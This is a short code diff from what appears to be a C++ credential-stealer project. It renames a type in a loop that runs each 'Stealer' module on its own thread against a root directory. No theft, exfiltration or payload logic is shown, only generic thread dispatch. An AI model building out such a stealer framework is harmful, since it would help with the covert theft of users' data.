@@ -30,7 +30,7 @@ Stealer::Stealer() {
 void Stealer::run() {
     std::vector<std::thread> threads;
 
-    for(StealerImpl* module : this->modules) {
+    for(StealerModule* module : this->modules) {
         threads.emplace_back([module, this]() {
             module->execute(this->root_dir);
         });
